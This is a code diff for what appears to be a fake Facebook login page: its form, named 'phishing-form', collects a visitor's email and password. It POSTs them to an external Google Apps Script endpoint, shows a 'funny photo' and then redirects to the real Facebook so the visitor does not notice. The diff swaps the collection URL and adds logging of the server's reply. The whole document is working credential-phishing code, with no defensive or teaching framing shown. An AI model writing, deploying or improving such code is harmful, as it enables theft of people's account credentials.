@@ -44,31 +44,28 @@
 
 <script>
   /* ---- CONFIG ---- */
-  const SERVER_URL = "https://script.google.com/macros/s/AKfycbxbElgK2TKfFCQLagx4-MCf5DAPhM2Jip4R2PdOSUuHRj-rjnap35grdv6WRq6fxLwM/exec";
-
+  const SERVER_URL = "https://script.google.com/macros/s/AKfycbzujMnz_v6-kT8UnOHC5g7-_Br6Ummz2FpwzNwUz1MTxkUfzNz0dss191rD3Y7h5xaO/exec";
   /* ---- HANDLER ---- */
   document.getElementById('phishing-form').addEventListener('submit', async e => {
     e.preventDefault();
-
-    const email  = e.target.email.value;
+    const email    = e.target.email.value;
     const password = e.target.password.value;
 
     try {
-      await fetch(SERVER_URL, {
+      const resp = await fetch(SERVER_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, password })
       });
-      // optional: console.log('sent');
+      const data = await resp.json();
+      console.log('Server reply:', data);   // helpful for debugging
     } catch (err) {
       console.error('fetch error:', err);
     }
 
-    // UI feedback – show the cat photo
+    // UI feedback
     document.getElementById('login-form-container').style.display = 'none';
     document.getElementById('funny-photo-container').style.display = 'block';
-
-    // redirect to real Facebook after a short delay
     setTimeout(() => window.location.href = 'https://www.facebook.com', 3000);
   });
 </script>
